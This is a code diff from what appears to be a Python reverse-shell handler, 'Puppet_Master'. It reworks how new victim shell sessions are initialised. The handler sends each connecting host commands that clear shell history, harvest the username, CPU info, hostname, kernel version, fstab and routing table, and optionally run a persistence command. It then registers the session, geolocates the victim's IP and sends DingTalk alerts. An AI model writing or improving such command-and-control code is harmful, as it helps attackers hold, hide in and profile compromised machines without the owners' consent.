@@ -70,112 +70,135 @@ IPSelect = QQwry()
 IPSelect.load_file("qqwry.dat")
 
 async def handle_shell_init(reader, writer):
-
-    init_data = bytes()
-
-    randomStringPrefix = randomString()
-    randomStringSuffix = randomString()
-    randomStringWhoamiPrefix = randomString()
-    randomStringWhoamiSuffix = randomString()
-    randomStringCPUinfoPrefix = randomString()
-    randomStringCPUinfoSuffix = randomString()
+    randomStringInitEND        = randomString()
+    randomStringPrefix         = randomString()
+    randomStringSuffix         = randomString()
+    randomStringWhoamiPrefix   = randomString()
+    randomStringWhoamiSuffix   = randomString()
+    randomStringCPUinfoPrefix  = randomString()
+    randomStringCPUinfoSuffix  = randomString()
     randomStringHostnamePrefix = randomString()
     randomStringHostnameSuffix = randomString()
-    randomStringInitEndSuffix = randomString()
-    init_command = str()
-    init_command += "export HISTSIZE=0;"
-    init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix};"
-    init_command += f"echo {randomStringCPUinfoPrefix} && cat /proc/cpuinfo && echo {randomStringCPUinfoSuffix};"
-    init_command += f"echo {randomStringHostnamePrefix} && cat /etc/hostname && echo {randomStringHostnameSuffix};"
-    init_command += f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringSuffix};"
-    init_command += "\n"
 
-    #如果持久化选项为True则执行deamon进程持久化命令
-    if Puppet_Master.Persistence:
-        init_command += Puppet_Master.PersistenceCommand + "\n"
-        
-    init_command += "echo {}\n".format(randomStringInitEndSuffix)
-
-    writer.write( init_command.encode() )
+    init_data  = str()
+    writer.write( f"export HISTSIZE=0; echo {randomStringWhoamiPrefix}; whoami; echo {randomStringWhoamiSuffix};\n".encode() )
     await writer.drain()
-
     while True:
         try:
-            data = await asyncio.wait_for( reader.read(40960), timeout=10 )
-            init_data += data
+            data       = await asyncio.wait_for( reader.read(40960), timeout=10 )
+            if not data.decode():
+                return None
+            rdata      = data.decode().replace( "echo "+randomStringWhoamiPrefix, "").replace( "echo "+randomStringWhoamiSuffix, "")
+            init_data += rdata
 
-            if randomStringInitEndSuffix in data.decode().replace(f"echo {randomStringInitEndSuffix}", ""):
-                # getTextBetweenStrings()未匹配到则返回<unknown>,若hostname或uesrname中包含也返回<unknown>
-                puppetHash = getTextBetweenStrings(
-                        init_data.decode().replace(f"echo {randomStringPrefix}", "").replace(f"echo {randomStringSuffix}", ""),
-                        randomStringPrefix,
-                        randomStringSuffix
-                        ).strip()
-
-                username = getTextBetweenStrings(
-                        init_data.decode().replace(f"echo {randomStringWhoamiPrefix}", "").replace(f"echo {randomStringWhoamiSuffix}", ""),
+            if (randomStringWhoamiPrefix in init_data) and (randomStringWhoamiSuffix in init_data):
+                username = getTextBetweenStrings( 
+                        init_data,
                         randomStringWhoamiPrefix,
                         randomStringWhoamiSuffix
                         ).strip()
+                break
+        except asyncio.TimeoutError:
+            writer.close()
+            return None
 
-                hostname = getTextBetweenStrings(
-                        init_data.decode().replace(f"echo {randomStringHostnamePrefix}", "").replace(f"echo {randomStringHostnameSuffix}", ""),
-                        randomStringHostnamePrefix,
-                        randomStringHostnameSuffix
-                        ).strip()
+        except Exception as e :
+            print(traceback.format_exc())
+            writer.close()
+            return None
 
-                cpuinfo  = getTextBetweenStrings(
-                        init_data.decode().replace(f"echo {randomStringCPUinfoPrefix}", "").replace(f"echo {randomStringCPUinfoSuffix}", ""),
+    writer.write( f"echo {randomStringCPUinfoPrefix}; cat /proc/cpuinfo; echo {randomStringCPUinfoSuffix};\n".encode() )
+    await writer.drain()
+    while True:
+        try:
+            data  = await asyncio.wait_for( reader.read(40960), timeout=10 )
+            if not data.decode():
+                return None
+            rdata = data.decode().replace( "echo "+randomStringCPUinfoPrefix, "").replace( "echo "+randomStringCPUinfoSuffix, "")
+            init_data += rdata
+            if randomStringCPUinfoPrefix in init_data and randomStringCPUinfoSuffix in init_data:
+                cpuinfo = getTextBetweenStrings( 
+                        init_data,
                         randomStringCPUinfoPrefix,
                         randomStringCPUinfoSuffix
                         ).strip()
+                break
+        except asyncio.TimeoutError:
+            writer.close()
+            return None
 
-                if "\n" in hostname:
-                    hostname = "<unknown>"
-                  
-                if "\n" in username:
-                  username = "<unknown>"
+        except Exception as e :
+            print(traceback.format_exc())
+            writer.close()
+            return None
 
-                #获取CPU核心数
-                session_cpu_core = str(cpuinfo.count("processor"))
-                #根据系统信息计算Session Hash
-                session_hash = hashlib.md5(puppetHash.encode()).hexdigest()
-
-                session = dict()
-                peername = writer.get_extra_info("peername")
-                sockname = writer.get_extra_info("sockname")
-                peername = peername[0]+":"+str(peername[1])
-                sockname = sockname[0]+":"+str(sockname[1])
-                session["inittime"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                session["peername"] = peername
-                session["sockname"] = sockname
-                session["username"] = username
-                session["hostname"] = hostname
-                session["history"]  = bytes()
-                session["reader"]   = reader
-                session["writer"]   = writer
-                session["hash"]     = session_hash
-                session["core"]     = session_cpu_core
-                session["org"]      = str()
-
-                if ( session["hash"] not in [ _["hash"] for _ in Puppet_Master.sessions ] ) or ( Puppet_Master.DuplicateSession ):
-                    org = IPSelect.lookup(peername.split(":")[0])
-
-                    session["org"] = org[0]+org[1]
-                    Puppet_Master.sessions.append(session)
-                    PrintInfo(f'Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
-                    await asyncio.to_thread( dingding_send_meassage, f'Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")} {org}' )
-                    break
-
-                else:
-                    if Puppet_Master.quiet == False:
-                        print(f'\033[33m[*] Session {session_hash} {hostname} {username}  {sockname} -> {peername} in sessions list {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\033[0m')
-                    writer.close()
-                    return None
-
-            elif not data.decode():
+    writer.write( f"echo {randomStringHostnamePrefix}; (cat /etc/hostname||hostname); echo {randomStringHostnameSuffix};\n".encode() )
+    await writer.drain()
+    while True:
+        try:
+            data  = await asyncio.wait_for( reader.read(40960), timeout=10 )
+            if not data.decode():
                 return None
+            rdata = data.decode().replace( "echo "+randomStringHostnamePrefix, "").replace( "echo "+randomStringHostnameSuffix, "")
+            init_data += rdata
+            if randomStringHostnamePrefix in init_data and randomStringHostnameSuffix in init_data:
+                hostname = getTextBetweenStrings( 
+                        init_data,
+                        randomStringHostnamePrefix,
+                        randomStringHostnameSuffix
+                        ).strip()
+                break
+        except asyncio.TimeoutError:
+            writer.close()
+            return None
 
+        except Exception as e :
+            print(traceback.format_exc())
+            writer.close()
+            return None
+
+    writer.write( f"echo {randomStringPrefix}; cat /proc/version /etc/fstab /proc/net/route; echo {randomStringSuffix};\n".encode() )
+    await writer.drain()
+    while True:
+        try:
+            data  = await asyncio.wait_for( reader.read(40960), timeout=10 )
+            if not data.decode():
+                return None
+            rdata = data.decode().replace( "echo "+randomStringPrefix, "").replace( "echo "+randomStringSuffix, "")
+            init_data += rdata
+            if randomStringPrefix in init_data and randomStringSuffix in init_data:
+                puppetHash  = username
+                puppetHash += getTextBetweenStrings( 
+                        init_data,
+                        randomStringPrefix,
+                        randomStringSuffix
+                        ).strip()
+                break
+        except asyncio.TimeoutError:
+            writer.close()
+            return None
+
+        except Exception as e :
+            print(traceback.format_exc())
+            writer.close()
+            return None
+
+    #如果持久化选项为True则执行deamon进程持久化命令
+    if Puppet_Master.Persistence:
+        writer.write( "{}\n".format(Puppet_Master.PersistenceCommand).encode() )
+        await writer.drain()
+
+    writer.write( f"echo {randomStringInitEND};\n".encode() )
+    await writer.drain()
+    while True:
+        try:
+            data  = await asyncio.wait_for( reader.read(40960), timeout=10 )
+            if not data.decode():
+                return None
+            rdata = data.decode().replace( "echo "+randomStringInitEND, "")
+            init_data += rdata
+            if randomStringInitEND in init_data: 
+                break
         except asyncio.TimeoutError:
             writer.close()
             return None
@@ -187,6 +210,48 @@ async def handle_shell_init(reader, writer):
             print(traceback.format_exc())
             writer.close()
             return None
+
+    if "\n" in hostname:
+        hostname = "<unknown>"
+      
+    if "\n" in username:
+        username = "<unknown>"
+
+    #获取CPU核心数
+    session_cpu_core = str(cpuinfo.count("processor"))
+    #根据系统信息计算Session Hash
+    session_hash = hashlib.md5(puppetHash.encode()).hexdigest()
+
+    session = dict()
+    peername = writer.get_extra_info("peername")
+    sockname = writer.get_extra_info("sockname")
+    peername = peername[0]+":"+str(peername[1])
+    sockname = sockname[0]+":"+str(sockname[1])
+    session["inittime"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    session["peername"] = peername
+    session["sockname"] = sockname
+    session["username"] = username
+    session["hostname"] = hostname
+    session["history"]  = bytes()
+    session["reader"]   = reader
+    session["writer"]   = writer
+    session["hash"]     = session_hash
+    session["core"]     = session_cpu_core
+    session["org"]      = str()
+
+    if ( session["hash"] not in [ _["hash"] for _ in Puppet_Master.sessions ] ) or ( Puppet_Master.DuplicateSession ):
+        org = IPSelect.lookup(peername.split(":")[0])
+
+        session["org"] = org[0]+org[1]
+        Puppet_Master.sessions.append(session)
+        PrintInfo(f'Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
+        await asyncio.to_thread( dingding_send_meassage, f'Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")} {org}' )
+
+    else:
+        if Puppet_Master.quiet == False:
+            print(f'\033[33m[*] Session {session_hash} {hostname} {username}  {sockname} -> {peername} in sessions list {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\033[0m')
+        writer.close()
+        return None
 
     while writer.is_closing()==False:
         data = await reader.read(40960)
